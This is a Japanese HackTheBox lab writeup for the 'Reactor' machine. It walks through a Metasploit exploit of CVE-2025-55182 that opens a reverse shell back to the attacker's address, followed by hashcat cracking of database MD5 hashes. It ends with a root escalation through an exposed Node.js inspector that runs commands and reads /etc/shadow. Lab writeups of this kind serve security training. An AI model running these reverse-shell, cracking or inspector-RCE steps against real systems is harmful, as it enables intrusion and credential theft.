# HackTheBox: Reactor — Writeup

> 出典: <https://security-blog-it.com/46749/> を整形・再構成したもの

## 概要

| 項目 | 値 |
| --- | --- |
| 対象 (Target) | `10.129.3.47` |
| 攻撃元 (Attacker) | `10.10.14.245` |
| 調査日 | 2026-05-24 |
| 難易度 | Medium |
| OS | Linux (Ubuntu 24.04) |

### 攻撃チェーン (全体像)

```
[Phase 1: 偵察]
  nmap → Port 22 (SSH / OpenSSH 9.6p1), 3000 (Next.js 15.0.3)
                          ↓
[Phase 2: 初期侵入 — CVE-2025-55182 (CVSS 10.0)]
  Metasploit → POST / + Next-Action: "" + RSC prototype pollution
  → node ユーザー (UID=999) リバースシェル取得
                          ↓
[Phase 3: 認証情報取得]
  reactor.db users テーブル → MD5 ハッシュ発見
    engineer: 39d97110eafe2a9a68639812cd271e8e → reactor1 (hashcat)
                          ↓
[Phase 4: SSH ログイン・列挙]
  ssh engineer@10.129.3.47 (reactor1)
  lxd グループ / SUID / cron / sudoers → 悪用不可
                          ↓
[Phase 5: 権限昇格 — Node.js --inspect RCE]
  ps aux → root 実行の node --inspect=127.0.0.1:9229 発見
  curl /json/list → WebSocket UUID 取得
  ssh -fNL 9229:127.0.0.1:9229 → ポートフォワード確立
  CDP Runtime.evaluate → child_process.execSync() を root で実行
                          ↓
[フラグ取得]
  user.txt: cfdcbd1c5c85b24df49a6005a66c468a
  root.txt: 54cbd58fa53892d092b93722de8d3bbb
```

権限昇格パス: `node (UID=999)` → `engineer (UID=1000)` → `root (UID=0)`

---

## Phase 1: 偵察 (Reconnaissance)

### 全ポートスキャン

```bash
nmap -p- --defeat-rst-ratelimit -T4 10.129.3.47
```

```text
Starting Nmap 7.98 at 2026-05-24 19:54 +0900
Host is up (0.22s latency).
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
Nmap done: 1 IP address (1 host up) scanned in 67.03 seconds
```

### SSH バナー取得

```bash
ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=5 10.129.3.47 2>&1 | head -3
```

```text
SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.16
```

### Web アプリケーション調査

```bash
curl -s -I http://10.129.3.47:3000/
```

```text
HTTP/1.1 200 OK
X-Powered-By: Next.js
Content-Type: text/html; charset=utf-8
Content-Length: 17175
```

| 項目 | 値 |
| --- | --- |
| フレームワーク | Next.js 15.0.3 |
| アプリ名 | ReactorWatch – CORE MONITORING SYSTEM v3.2.1 |
| Build ID | `L3bimJe_3LvBcFWAnK5L4` |

---

## Phase 2: 初期侵入 — CVE-2025-55182 (React2Shell)

> ⚠️ **CVE-2025-55182 (CVSS 10.0 Critical)** — React Server Components の RSC Flight プロトコルにおける非認証 RCE。`__proto__` / `constructor` をモジュール名として送信しプロトタイプ汚染を引き起こす。

### ポート競合の解消

```bash
fuser -k 4444/tcp
```

### Metasploit 脆弱性チェック

リソーススクリプト `/tmp/run_check.rc`:

```text
use exploit/multi/http/react2shell_unauth_rce_cve_2025_55182
set RHOSTS 10.129.3.47
set RPORT 3000
set LHOST 10.10.14.245
set LPORT 4444
set TARGET 0
set PAYLOAD cmd/unix/reverse_nodejs
check
exit
```

```bash
msfconsole -q -r /tmp/run_check.rc
```

```text
[*] Processing /tmp/run_check.rc for ERB directives.
[*] Using configured payload cmd/unix/reverse_nodejs
[*] 10.129.3.47:3000 - The target appears to be vulnerable.
```

✅ ターゲットは CVE-2025-55182 に対して脆弱であることを確認。

### Metasploit エクスプロイト実行

リソーススクリプト `/tmp/run_exploit.rc`:

```text
use exploit/multi/http/react2shell_unauth_rce_cve_2025_55182
set RHOSTS 10.129.3.47 / set RPORT 3000
set LHOST 10.10.14.245 / set LPORT 4444
set PAYLOAD cmd/unix/reverse_nodejs
set VERBOSE true
run -j
sleep 20
sessions -c "id"
sessions -c "whoami"
sessions -c "cat /root/root.txt 2>/dev/null || echo PERMISSION_DENIED"
```

```bash
msfconsole -q -r /tmp/run_exploit.rc
```

```text
[*] Started reverse TCP handler on 10.10.14.245:4444
[+] The target appears to be vulnerable.
[*] Command shell session 1 opened (10.10.14.245:4444 -> 10.129.3.47:35966)

[*] Running 'id' on shell session 1 (10.129.3.47)
uid=999(node) gid=988(node) groups=988(node)

[*] Running 'cat /root/root.txt' on shell session 1
cat: /root/root.txt: Permission denied
```

⚡ node ユーザー (UID=999) でリバースシェル取得成功。root 権限なし → 権限昇格が必要。

---

## Phase 3: 認証情報取得

> ℹ️ フェーズ2で取得した node ユーザーシェル上で実行。

### ホームディレクトリ確認

```bash
ls -l /home
```

```text
total 8
drwxr-x--- 4 engineer engineer 4096 May 20 10:12 engineer
drwxr-x--- 2 node     node     4096 May 18 11:40 node
```

### アプリケーションデータベース確認

```bash
strings /opt/reactor-app/reactor.db
```

```text
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL,
    email TEXT
engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
admin   |203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
```

| ユーザー | MD5 ハッシュ | ロール |
| --- | --- | --- |
| engineer | `39d97110eafe2a9a68639812cd271e8e` | operator |
| admin | `203b22191d744a4e70ada5c101b17b8` | administrator |

### ハッシュ解析 (Kali)

```bash
printf '%s\n' "39d97110eafe2a9a68639812cd271e8e" \
              "0203b22191d744a4e70ada5c101b17b8" > /tmp/hashes_reactor.txt

hashcat -m 0 /tmp/hashes_reactor.txt /tmp/rockyou.txt \
  --quiet --potfile-path /tmp/hashcat_reactor.pot
```

```text
39d97110eafe2a9a68639812cd271e8e:reactor1
0203b22191d744a4e70ada5c101b17b8: (未解析 — 31文字・非標準)
```

✅ **認証情報取得: `engineer : reactor1`**

---

## Phase 4: SSH ログイン・ユーザー情報収集

### SSH ログイン確認

```bash
sshpass -p 'reactor1' ssh -o StrictHostKeyChecking=no \
  engineer@10.129.3.47 'id && uname -a && groups'
```

```text
uid=1000(engineer) gid=1000(engineer)
groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)
Linux reactor 6.8.0-117-generic x86_64 GNU/Linux
```

> ⚠️ lxd グループに所属 — 権限昇格ベクター候補 (ただし LXD 未初期化につき利用不可)。

### 権限昇格ベクター調査結果

| 調査項目 | コマンド | 結果 |
| --- | --- | --- |
| SUID バイナリ | `find / -perm -4000` | 標準バイナリのみ・悪用不可 |
| ケーパビリティ | `getcap -r /` | 悪用可能なものなし |
| Cron ジョブ | `cat /etc/cron.d/*` | 書き込み可能スクリプトなし |
| sudoers | `ls /etc/sudoers.d/` | engineer への sudo 権限なし |
| 書き込み可能ファイル | `find / -writable` | 対象なし |
| LXD | `lxc list` | 未初期化・コンテナ/イメージなし |

---

## Phase 5: 権限昇格 — Node.js `--inspect` RCE

### root 実行プロセス発見

```bash
sshpass -p 'reactor1' ssh engineer@10.129.3.47 \
  'ps aux | grep root | grep -v "\[" | grep -v grep'
```

```text
root  1386  /usr/sbin/cron -f -P
root  1389  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js  ← 重要
```

> 🎯 root 権限で Node.js インスペクター (デバッガー) が稼働中 — CDP 経由で任意 JavaScript を root として実行可能。

### ポート・プロセス・CDP エンドポイント確認

```bash
# ポートリスニング確認
ss -tlnp | grep 9229
# → LISTEN 0  511  127.0.0.1:9229  0.0.0.0:*

# CDP REST エンドポイント取得
curl -s http://127.0.0.1:9229/json/list
```

```json
[ {
  "type": "node",
  "title": "/opt/uptime-monitor/worker.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/40289910-cc64-4fb9-9062-fe8daf38e2cf"
} ]
```

```text
Browser: node.js/v20.20.2 / Protocol-Version: 1.1
```

### SSH ポートフォワード設定

```bash
sshpass -p 'reactor1' ssh -o StrictHostKeyChecking=no \
  -fNL 9229:127.0.0.1:9229 engineer@10.129.3.47

ss -tlnp | grep 9229
# → LISTEN 0  128  127.0.0.1:9229  users:(("ssh",pid=62249,fd=5))
```

### CDP エクスプロイト実行

```bash
# Kali 側
npm install -g ws

NODE_PATH=/usr/local/lib/node_modules node /tmp/cdp_collect.js
# cdp_collect.js: WebSocket → Runtime.evaluate → child_process.execSync()
```

```text
[*] Connected to Node.js inspector (root process)

=== id ===
uid=0(root) gid=0(root) groups=0(root)

=== root_flag ===
54cbd58fa53892d092b93722de8d3bbb

=== user_flag ===
cfdcbd1c5c85b24df49a6005a66c468a

=== shadow ===
root:$y$j9T$eJAH7p7TxU.lFZFC0WOND/$1mw...

[*] Done.
```

🏆 root 権限でのコード実行成功 — 両フラグ取得完了。

---

## フラグ

### USER FLAG — `/home/engineer/user.txt`

```
cfdcbd1c5c85b24df49a6005a66c468a
```

- 取得方法: SSH 直接読み取り / CDP 経由

### ROOT FLAG — `/root/root.txt`

```
54cbd58fa53892d092b93722de8d3bbb
```

- 取得方法: CDP `Runtime.evaluate` (root RCE)

---

## 使用ツール

| ツール | 用途 |
| --- | --- |
| nmap | ポートスキャン |
| curl | Web / CDP REST API |
| msfconsole | CVE-2025-55182 エクスプロイト |
| sshpass + ssh | SSH 認証・トンネル |
| hashcat | MD5 クラック (reactor1) |
| node + ws | CDP WebSocket エクスプロイト |
| strings | バイナリ文字列抽出 |
| fuser / ss | ポート管理・確認 |
